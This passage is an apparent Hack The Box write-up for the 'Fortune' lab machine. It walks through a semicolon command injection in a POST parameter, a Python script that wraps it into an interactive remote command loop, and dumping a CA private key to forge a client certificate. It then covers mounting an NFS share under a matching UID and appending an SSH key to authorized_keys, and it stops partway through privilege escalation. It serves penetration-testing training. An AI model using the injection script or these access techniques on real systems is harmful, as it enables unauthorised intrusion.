---
layout: post
title: Hack The Box - Fortune
categories: hack-the-box
tags: [bsd, web, rce, python, exploit-development, networking, pivoting, ssh, php]
description: My write-up for Fortune from Hack The Box.
image: /hackthebox/fortune/0.png
---

<hr>
## Quick Summary 
<br> Hey guys today Fortune retired and here's my write-up about it. It was a very cool box and I really liked it, like the last retired box [LaCasaDePapel](/hack-the-box/lacasadepapel) it had `RCE` and client certificate generation to access a restricted `https` service, but that's only for the initial steps as this box had a lot of interesting stuff. It's an OpenBSD box and its ip is `10.10.10.127`, I added it to `/etc/hosts` as `fortune.htb`. Let's jump right in !
![](/images/hackthebox/fortune/0.png)
<hr>
## Nmap
<br> As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT -sC fortune.htb`
![](/images/hackthebox/fortune/1.png)
<br> We have `http`, `https` on port 80, port 443 and we have `ssh` on port 22 so we will be focusing on the web services.
<br>
<hr>
## HTTP Initial Enumeration
<br> The index page on `http://fortune.htb` is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :
![](/images/hackthebox/fortune/2.png)
<br>
<br>
![](/images/hackthebox/fortune/3.png)
<br>
<br>
![](/images/hackthebox/fortune/4.png)
<br> On `https://fortune.htb` we get a handshake error, this probably means that we need a client certificate.
![](/images/hackthebox/fortune/5.png)
<hr>
## RCE, Client Certificate Generation
<br> Back to `http://fortune.htb` I intercepted the request with burp and there was only one parameter in the POST request called `db`, after trying some different things I could get `RCE` by appending a semi-colon `;` :
<br> Request :
```
POST /select HTTP/1.1
Host: fortune.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://fortune.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Connection: close
Upgrade-Insecure-Requests: 1

db=;pwd
```
<br> Response :
```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Fri, 02 Aug 2019 11:08:49 GMT
Server: OpenBSD httpd
Content-Length: 680

<!DOCTYPE html>
<html>
<head>
<title>Your fortune</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
<h2>Your fortune is:</h2>
<p><pre>

Bagbiter:
	1. n.; Equipment or program that fails, usually
intermittently.  2. adj.:  Failing hardware or software.  &#34;This
bagbiting system won&#39;t let me get out of spacewar.&#34;  Usage:  verges on
obscenity.  Grammatically separable; one may speak of &#34;biting the
bag&#34;.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,
CHOMPER, CHOMPING.
/var/appsrv/fortune


</pre><p>
<p>Try <a href='/'>again</a>!</p>
</body>
</html>
```
<br> I couldn't get a reverse shell, get `ssh` or read the user flag so we are going to enumerate the box through this `RCE` for some time.
<br> I wrote a script to make it easier : 
```
#!/usr/bin/python3
import requests
import sys

YELLOW = "\033[93m"
GREEN = "\033[32m"

def exploit(payload):
	post_data = {"db":payload}
	req = requests.post("http://10.10.10.127/select",data=post_data)
	response = req.text
	return response

def filter(response):
	start = "rce_result"
	end = "rce_result_end"
	result = response[response.find(start)+len(start):response.rfind(end)]
	return result

while True:
	rce = input(GREEN + "[?] command : ")
	payload = ";echo rce_result;{};echo rce_result_end".format(rce)
	response = exploit(payload)
	result = filter(response)
	print(YELLOW + "[*] Result :")
	print(result)
```
<br> This script takes the command to execute then sends the payload which is `;echo rce_result;COMMAND;echo rce_result_end` then it searches through the response and prints the string between `rce_result` and `rce_result_end` which is the output of our command.
![](/images/hackthebox/fortune/6.png)
<br> There are 3 users on the box : `bob`, `charlie` and `nfsuser` :
```
[?] command : ls -la /home
[*] Result :

total 20
drwxr-xr-x   5 root     wheel    512 Nov  2  2018 .
drwxr-xr-x  13 root     wheel    512 Aug  2 05:47 ..
drwxr-xr-x   5 bob      bob      512 Nov  3  2018 bob
drwxr-x---   3 charlie  charlie  512 Aug  2 06:21 charlie
drwxr-xr-x   2 nfsuser  nfsuser  512 Nov  2  2018 nfsuser
```
<br> In `bob`'s home directory there was a directory called `ca` :
```
[?] command : ls -la /home/bob
[*] Result :

total 48
drwxr-xr-x  5 bob   bob    512 Nov  3  2018 .
drwxr-xr-x  5 root  wheel  512 Nov  2  2018 ..
-rw-r--r--  1 bob   bob     87 Oct 11  2018 .Xdefaults
-rw-r--r--  1 bob   bob    771 Oct 11  2018 .cshrc
-rw-r--r--  1 bob   bob    101 Oct 11  2018 .cvsrc
-rw-r--r--  1 bob   bob    359 Oct 11  2018 .login
-rw-r--r--  1 bob   bob    175 Oct 11  2018 .mailrc
-rw-r--r--  1 bob   bob    215 Oct 11  2018 .profile
-rw-------  1 bob   bob     13 Nov  3  2018 .psql_history
drwx------  2 bob   bob    512 Nov  2  2018 .ssh
drwxr-xr-x  7 bob   bob    512 Oct 29  2018 ca
drwxr-xr-x  2 bob   bob    512 Nov  2  2018 dba
```
<br> I enumerated that directory for some time and there was a directory called `intermediate` where I found a certificate and a key :
```
[?] command : ls -la /home/bob/ca
[*] Result :

total 56
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  5 bob  bob   512 Nov  3  2018 ..
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob   115 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
-rw-r--r--  1 bob  bob     0 Oct 29  2018 index.txt.old
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 intermediate
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4200 Oct 29  2018 openssl.cnf
drwx------  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate
[*] Result :

total 60
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 ..
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob     5 Oct 29  2018 crlnumber
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 csr
-rw-r--r--  1 bob  bob   107 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4328 Oct 29  2018 openssl.cnf
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate/certs
[*] Result :

total 32
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--r--r--  1 bob  bob  4114 Oct 29  2018 ca-chain.cert.pem
-r--r--r--  1 bob  bob  1996 Oct 29  2018 fortune.htb.cert.pem
-r--r--r--  1 bob  bob  2061 Oct 29  2018 intermediate.cert.pem

[?] command : ls -la /home/bob/ca/intermediate/private
[*] Result :

total 20
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem

[?] command : cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
[*] Result :

-----BEGIN CERTIFICATE-----                           
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
-----END CERTIFICATE-----

[?] command : cat /home/bob/ca/intermediate/private/intermediate.key.pem
[*] Result :


-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAuTGpzUbl4RIyDuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6N
TzZAjOvCAJu7tiJjnvrUxf4SzuLRQEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd9
9fN/MDz288Rv7Z24LKWvPoEFWU5DSpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1o
W/kbz9205JT1LvR+mqNWbH/0Q92K7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI9
7sB6jXxlgHzblwFlQaHvh6H7u6rCm/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL
6YmfIsPJdu4NoeEeXofqwQjNf2bsjgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/S
ybEGB3vBe4e+wvzkT7YD4lqubvXZO346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVo
KmimYUWi2fJ/1B2PgRrzv/mmlgL7JOpJNWMUbc8bEf698QziuCXj5R/+Lover058
nrvCAnI4I4wUHTGAgOC1J4hbVoYXEjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xp
ANJIlxH0gwaTQ4a8HAPBliHnEV0vXK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb
7K4H1yh5VF9zkLCTN6WYoaSM1Z0Tnb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEA
AQKCAgEAkjfD+W+g0LOtElN2TtYewtRAPVYc+9ogRKq28PUtpEemGccLix8qmBkM
c66B5qwAO+WPWUPhVbd/v2OIiqQYbnfGe7p1klwCg7sYlg2ilyaLX2tA6I/4O/3m
fVD7joCYiafHVXJI5toEBz4znHdidokaQOODcE0A9ig1pIuKrX3Ktghl/TgR3W0P
BesWKpyf2ThdZA0irvKcXaY3fpxBOxho5CV8WW8KpBld70Uu79v0OdGPVJJkMJGn
EmuCdReE+u0AUfZy6xlHzhs5/DUEwkP3gwSCs0IICyDnEQPkfn3cOIKCdUFTg/9R
cbVCzi0P7VMi5oYsugppezeBjiX+EDQogYDpSF94aFy8FdG6UgGLUpicNyG93niL
iXTJ0X0MS1E1AWSvECguIuUaNuDW+ZOdMCGoKKVCjTzHGvMunSP5ibIhSprhf4v0
KrBxalXAZafq6jVrEkQkNQrVVaodkFMFH4+J3Sa8Zi1mOiQ9xFmGMV+8AUiz899J
4PHcf7WzLb/FilyhwIM3HPSI7n3mJ0x7xkuQ3COxioVbvCkz0fAaQzz1U8h/pFxV
+wfx2X5F3N8RzU5ufR/M/Asni8RId7M8TJ44qWQln8itM+0aWTKiLrhBOcC55eug
hHIop2z+amPqxsynTVbbmiVwGpCYGNt3Q/7/FovcxF36hkbULwECggEBAPPgQwX4
gL9PBBwSi2oCS+164tSTc0B3R31B0AatewdXyASNYml9rCTOa/VJntvIAHDvWQ3+
wfrf34/1DIdZttwPYpcKAiWz/CXqPqEhd3uFLOrRoo1xBaenwLvCI99cYEvcrQIF
ctBDsqGytJ/Begs7dg04KLZUbsoYVTzkwf9O0I1aEHY4r9cUfXyPBYFl1qJdJoY1
83sZAZo+DXLdmtXVpoM/8MlhnMfg9VQ+txrMZg+1zEiuiNY9Rmv6CDpx68WcNKxF
y6mEkR8Ux3ZdHht/9azTU9n2btsx3EPBviwgiXuPLdCwyjfopcUaj+2cX9n5dO5E
HFZXUnQKj5UgttcCggEBAMJmkplp9ofzkF17Z+B6u/PJHmFKBn/PgD1NKBlGINIY
wh/3mFq1AvqHqy9Y9q9H+S/rIr8i+ADi39lWUywYWbGxpTJ6q68tKJR2UVxP0otZ
CRqtqV/BUhADeXrxnSdTEtA9CTgLEn+fHbDGwzW1nhB/EsEfQFQBx31juR2k5kR3
LFpiex3zAvVYOuM9fkHsCp5rDsvv10/6+aUzVOXwYzNfDBU9PpdK0AnTy0rijXM4
4Ky6/DFEMRCh1yC/O99u8AomyvlPJXyOFlrijUikBGpBUE60zB0dFw62NlBZg0BX
po2sJnPZYgERFCb2jCK2SJnWWgtPvQbwHqXBLj4uxPUCggEBALEHSP/LjQHSRORv
3b29HwqrWn7+7fmM3Fsja/N8+MKyyOHtE9QJwu0Q3rM2ltdpjlBsnhOXq44F9s4U
Dt0tlZyWmnWTcU2XImEPchkbJxWF7b4jIMFVmspB7pkc61dXQhuve/Lsq5RcoA3a
oF0bYBFJP3+HFZ6NGcMf+Lf0QpKmzqLdDvgSXCpfmFvToiZ1G2HPBokEHtNrqosh
ojeQf7XbmjzKLGqyrdE2Dj/yKo6Mc0XSLRFRiMkjv7vfyxtJ2OEga+fl3loWfhW2
yre0Dofd0iN7X/Hnfj8lKYQR3o8/qy0DGTnVK2V8PuEeT/4mtjmPaH8Q+BUA3DyZ
8fJJxg8CggEAJ+AoZAWjRyHD1BkTJq2mTgxMCgLIMIFcubZQ6lZDNzVS5IHCI6EL
ml4n1A94kl2+FIEz4GcI3g2rgwY9C0d3Zoac7yzQeJ9XupRGfhv1gRXjUzCaFIUw
Ew7TZU+YP8+/hS1v7an/wmPeEDvFIQg/Av092JVTeaffxq2k9Bq2DQcw9t1Kicsm
KTNO6PvdISKMzxAAuf5ZeRNvD97mpD/Z6ViuvtCQPTJgWBO0mIi+IQtisqusPWLS
eano2dPAMUWtQTfR3K/KbbErjrr35hWWvkDley+EytgDucXQgEzMKm+QP3E3df36
J2PccV2TQy+G1t9sGvPhP0IT10Y3+RNY3QKCAQBCgyEOu2PEHO4FHHJsyXSN9als
OZa+sOykZ/7fdjBZpAsjvcmxUfAxT07+EVUz4Wo186BKlthQjVLoLd2QfeTYmGhj
IsZnjm0Ds8ezFka/3Cu7YwGt6MBfUO6Vq2MLlUDgvtcWPTvBvipfmfZtJ0x2hhNv
y6Lpg/KJrald3NHrIcS4GvE8gxz1AFmMM0j00EuJSZk66hpC2bBKMunXAquPDN3g
XPwjyvXUcxDf8Jx1MGFfO++6RlZMEO7jmB/xgonPkWP4xEcQlOQ65UfhpLjfum96
Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk
-----END RSA PRIVATE KEY-----
```
<br> We can use them to generate a `PKCS12` certificate to access the `https` service. with `openssl` we can do it with a single command : 
```
openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
```
```
root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -al
total 20
drwxr-xr-x 2 root root 4096 Aug  2 13:40 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -la
total 28
drwxr-xr-x 2 root root 4096 Aug  2 13:43 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# 
```
<br> Now we can import the certificate in Firefox :
![](/images/hackthebox/fortune/7.png)
<br>
<br>
![](/images/hackthebox/fortune/8.png)
<br>
<br>
![](/images/hackthebox/fortune/9.png)
<br> After removing the SSL exception it will ask for our certificate and give us access :
![](/images/hackthebox/fortune/10.png)
<hr>
## Elevated Network Access, NFS, User Flag
<br> After getting access to `https` this message is what's on the index page :
![](/images/hackthebox/fortune/11.png)
<br> I didn't know what `authpf` was so I searched about it.
> authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user's session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - [freeBSD manual](https://www.freebsd.org/cgi/man.cgi?query=authpf&apropos=0&sektion=8&manpath=FreeBSD+8.1-RELEASE+and+Ports&format=html)


<br> So basically this can give access to some filtered services we weren't allowed to access before, to use it we need a key and luckily we can generate one :
![](/images/hackthebox/fortune/12.png)
<br> We have 3 users on the box, I tried all of them and `nfsuser` worked :
![](/images/hackthebox/fortune/13.png)
<br> Now is the time for another `nmap` scan :
`nmap -sV -sT -sC fortune.htb`
![](/images/hackthebox/fortune/14.png)
<br> We have two new ports, 8081 which is running `http` and `2049` which is running `nfs`. The `http` service gives us this message :
![](/images/hackthebox/fortune/15.png)
<br> So probably we need to focus on `nfs`.
> **Network File System** (**NFS**) is a [distributed file system](https://en.wikipedia.org/wiki/Distributed_file_system) protocol originally developed by [Sun Microsystems](https://en.wikipedia.org/wiki/Sun_Microsystems) in 1984, allowing a user on a client [computer](https://en.wikipedia.org/wiki/Computer) to access files over a [computer network](https://en.wikipedia.org/wiki/Computer_network) much like local storage is accessed.  -[Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)


<br> I used the `RCE` script to check `/etc/exports` and the only thing there was `/home` :
```
[?] command : cat /etc/exports
[*] Result :

/home
```
<br> By using `nfs-ls` (which is a part of the package `libnfs-utils`) we can successfully list the directories :
```
root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
drwxr-xr-x  2  1002  1002          512 nfsuser
drwxr-xr-x  5  1001  1001          512 bob
drwxr-x---  3  1000  1000          512 charlie
```
<br> I created a directory, called it `mnt` and mounted the `nfs` share in it :
```
root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt && mount -t nfs fortune.htb:/home ./mnt
root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
total 12
drwxr-xr-x 5 root root  512 Nov  3  2018 .
drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..
drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob
drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
root@kali:~/Desktop/HTB/boxes/fortune# 
```
<br> However I couldn't access `charlie`'s directory :
```
root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
-bash: cd: charlie: Permission denied
```
<br> This is because I'm trying with `root` whose `uid` is `0` :
```
root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
uid=0(root) gid=0(root) groups=0(root)
root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
```
<br> And the way `nfs` permissions work I need to have the same `uid` as `charlie` which is `1000` :
```
[?] command : id charlie
[*] Result :

uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)
```
<br> I already have a user on my box with the `uid` 1000 called `rick` :
```
root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
uid=1000(rick) gid=1000(rick) groups=1000(rick)
root@kali:~/Desktop/HTB/boxes/fortune/mnt#
```
![](/images/hackthebox/fortune/16.png)
<br> We owned user.
<br>
<hr>
## Privilege Escalation, Root Flag
<br> First thing I wanted to do is to get `ssh`, luckily I had write access to `authorized_keys` :
```
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
total 22
drwxr-x--- 3 rick rick 512 Nov  6  2018 .
drwxr-xr-x 5 root root 512 Nov  3  2018 ..
-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc
-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc
-rw-r----- 1 rick rick 359 Oct 11  2018 .login
-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc
-rw------- 1 rick rick 608 Nov  3  2018 mbox
-rw-r----- 1 rick rick 216 Oct 11  2018 .profile
drwx------ 2 rick rick 512 Nov  2  2018 .ssh
-r-------- 1 rick rick  33 Nov  3  2018 user.txt
-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ cd .ssh
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ ls -la
total 4
drwx------ 2 rick rick 512 Nov  2  2018 .
drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
```
<br> I used `ssh-keygen` to generate a private and a public key :
```
root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/HTB/boxes/fortune/ssh/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.
Your public key has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.pub.
The key fingerprint is:
SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ/Gt+Cs root@kali
The key's randomart image is:
+---[RSA 2048]----+
|%B*  .           |
|=O..  o .        |
|++. .. . .       |
|B o.. . .        |
|=+...+ .S        |
|+.o...o.         |
|oo o  +..        |
|+.o  E +.        |
|%++.  ..         |
+----[SHA256]-----+
root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
root@kali:~/Desktop/HTB/boxes/fortune#
```
<br> Then I wrote my public key to `authorized_keys` and got `ssh` as `charlie` :
```
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali" >> authorized_keys 
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
rick@kali:/root/Desktop/HTB/boxes/fortune/ssh$ su
Password: 
root@kali:~/Desktop/HTB/boxes/fortune/ssh# ssh charlie@fortune.htb -i id_rsa
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ 
```
<br> In the home directory of `charlie` there was a file called `mbox` which had an email from `bob` to `charlie` thanking him for setting up `pgadmin4` for him and also telling him that he set the `dba` password to the same as root password :
```
fortune$ ls -al
total 44
drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .
drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..
-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults
-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc
-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc
-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login
-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc
-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile
drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh
-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox
-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt
fortune$ cat mbox                                                                                                                                                                                                 
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: <bob@fortune.htb>
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for <charlie@fortune.htb>;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  <bob@fortune.htb>
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: <196699abe1fed384@fortune.htb>
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob

fortune$ 
```
<br>  Note : [`pgadmin`](https://www.pgadmin.org/) is an administration and development platform for `PostgreSQL`. 
<br> Earlier when we got the elevated network access there was an `http` port for `pgadmin4` so I checked its web directory in `/var/appsrv` and the database was there :
```
fortune$ cd /var/appsrv/                                                                                                                                                                                          
fortune$ ls -la
total 20
drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune
drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth
fortune$ cd pgadmin4/                                                                                                                                                                                             
fortune$ ls -la
total 252
